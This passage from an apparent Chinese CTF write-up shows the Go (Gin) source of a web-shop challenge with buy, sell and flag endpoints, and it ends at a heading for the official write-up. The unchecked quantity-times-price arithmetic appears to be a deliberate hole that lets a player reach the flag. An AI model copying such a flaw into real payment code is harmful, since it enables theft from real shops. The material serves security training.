+
+	<span class="token keyword">if</span> user<span class="token punctuation">.</span>Money <span class="token operator">>=</span> product<span class="token punctuation">.</span>Price<span class="token operator">*</span><span class="token function">int64</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+		user<span class="token punctuation">.</span>Money <span class="token operator">-=</span> product<span class="token punctuation">.</span>Price <span class="token operator">*</span> <span class="token function">int64</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>
+		user<span class="token punctuation">.</span>Items<span class="token punctuation">[</span>product<span class="token punctuation">.</span>Name<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token function">int64</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>
+		c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>
+			<span class="token string">"message"</span><span class="token punctuation">:</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"Buy %v * %v success"</span><span class="token punctuation">,</span> product<span class="token punctuation">.</span>Name<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">,</span>
+		<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+	<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+		c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>
+			<span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"You don't have enough money"</span><span class="token punctuation">,</span>
+		<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+	<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">func</span> <span class="token function">SellHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+	s <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>
+	user <span class="token operator">:=</span> users<span class="token punctuation">[</span>s<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+
+	data <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token keyword">interface</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+	c<span class="token punctuation">.</span><span class="token function">ShouldBindJSON</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>data<span class="token punctuation">)</span>
+
+	<span class="token keyword">var</span> product <span class="token operator">*</span>Product
+
+	<span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> v <span class="token operator">:=</span> <span class="token keyword">range</span> products <span class="token punctuation">&#123;</span>
+		<span class="token keyword">if</span> data<span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span> <span class="token operator">==</span> v<span class="token punctuation">.</span>Name <span class="token punctuation">&#123;</span>
+			product <span class="token operator">=</span> v
+			<span class="token keyword">break</span>
+		<span class="token punctuation">&#125;</span>
+	<span class="token punctuation">&#125;</span>
+
+	<span class="token keyword">if</span> product <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
+		c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>
+			<span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"No such product"</span><span class="token punctuation">,</span>
+		<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+		<span class="token keyword">return</span>
+	<span class="token punctuation">&#125;</span>
+
+	count <span class="token operator">:=</span> user<span class="token punctuation">.</span>Items<span class="token punctuation">[</span>data<span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+	n<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> strconv<span class="token punctuation">.</span><span class="token function">Atoi</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">"num"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+	<span class="token keyword">if</span> n <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>
+		c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>
+			<span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Product num can't be negative"</span><span class="token punctuation">,</span>
+		<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+		<span class="token keyword">return</span>
+	<span class="token punctuation">&#125;</span>
+
+	<span class="token keyword">if</span> count <span class="token operator">>=</span> <span class="token function">int64</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+		user<span class="token punctuation">.</span>Money <span class="token operator">+=</span> product<span class="token punctuation">.</span>Price <span class="token operator">*</span> <span class="token function">int64</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>
+		user<span class="token punctuation">.</span>Items<span class="token punctuation">[</span>product<span class="token punctuation">.</span>Name<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token function">int64</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>
+		c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>
+			<span class="token string">"message"</span><span class="token punctuation">:</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"Sell %v * %v success"</span><span class="token punctuation">,</span> product<span class="token punctuation">.</span>Name<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">,</span>
+		<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+	<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+		c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>
+			<span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"You don't have enough product"</span><span class="token punctuation">,</span>
+		<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+	<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">func</span> <span class="token function">FlagHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+	s <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>
+	user <span class="token operator">:=</span> users<span class="token punctuation">[</span>s<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+
+	v<span class="token punctuation">,</span> ok <span class="token operator">:=</span> user<span class="token punctuation">.</span>Items<span class="token punctuation">[</span><span class="token string">"Flag"</span><span class="token punctuation">]</span>
+	<span class="token keyword">if</span> <span class="token operator">!</span>ok <span class="token operator">||</span> v <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>
+		c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>
+			<span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"You must buy &lt;code>flag&lt;/code> first"</span><span class="token punctuation">,</span>
+		<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+		<span class="token keyword">return</span>
+	<span class="token punctuation">&#125;</span>
+
+	flag<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">ReadFile</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">)</span>
+	c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>
+		<span class="token string">"message"</span><span class="token punctuation">:</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"Here is your flag: &lt;code>%s&lt;/code>"</span><span class="token punctuation">,</span> <span class="token function">string</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+	<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+	secret <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
+	rand<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span>
+
+	tpl<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> template<span class="token punctuation">.</span><span class="token function">ParseFS</span><span class="token punctuation">(</span>fs<span class="token punctuation">,</span> <span class="token string">"public/index.html"</span><span class="token punctuation">)</span>
+	store <span class="token operator">:=</span> cookie<span class="token punctuation">.</span><span class="token function">NewStore</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span>
+
+	r <span class="token operator">:=</span> gin<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+	r<span class="token punctuation">.</span><span class="token function">SetHTMLTemplate</span><span class="token punctuation">(</span>tpl<span class="token punctuation">)</span>
+	r<span class="token punctuation">.</span><span class="token function">Use</span><span class="token punctuation">(</span>sessions<span class="token punctuation">.</span><span class="token function">Sessions</span><span class="token punctuation">(</span><span class="token string">"gosession"</span><span class="token punctuation">,</span> store<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+	r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> IndexHandler<span class="token punctuation">)</span>
+
+	api <span class="token operator">:=</span> r<span class="token punctuation">.</span><span class="token function">Group</span><span class="token punctuation">(</span><span class="token string">"/api"</span><span class="token punctuation">)</span>
+	<span class="token punctuation">&#123;</span>
+		api<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/info"</span><span class="token punctuation">,</span> InfoHandler<span class="token punctuation">)</span>
+		api<span class="token punctuation">.</span><span class="token function">POST</span><span class="token punctuation">(</span><span class="token string">"/buy"</span><span class="token punctuation">,</span> BuyHandler<span class="token punctuation">)</span>
+		api<span class="token punctuation">.</span><span class="token function">POST</span><span class="token punctuation">(</span><span class="token string">"/sell"</span><span class="token punctuation">,</span> SellHandler<span class="token punctuation">)</span>
+		api<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> FlagHandler<span class="token punctuation">)</span>
+		api<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/reset"</span><span class="token punctuation">,</span> ResetHandler<span class="token punctuation">)</span>
+	<span class="token punctuation">&#125;</span>
+
+	r<span class="token punctuation">.</span><span class="token function">StaticFileFS</span><span class="token punctuation">(</span><span class="token string">"/static/main.js"</span><span class="token punctuation">,</span> <span class="token string">"public/main.js"</span><span class="token punctuation">,</span> http<span class="token punctuation">.</span><span class="token function">FS</span><span class="token punctuation">(</span>fs<span class="token punctuation">)</span><span class="token punctuation">)</span>
+	r<span class="token punctuation">.</span><span class="token function">StaticFileFS</span><span class="token punctuation">(</span><span class="token string">"/static/simple.css"</span><span class="token punctuation">,</span> <span class="token string">"public/simple.css"</span><span class="token punctuation">,</span> http<span class="token punctuation">.</span><span class="token function">FS</span><span class="token punctuation">(</span>fs<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+	r<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token string">":8000"</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>官方wp介绍：</p>
+<p><img src="https://img-blog.csdnimg.cn/244ac8e4d87f4ccba56801b545fb6c11.png" alt="132"></p>
  
       <!-- reward -->
       
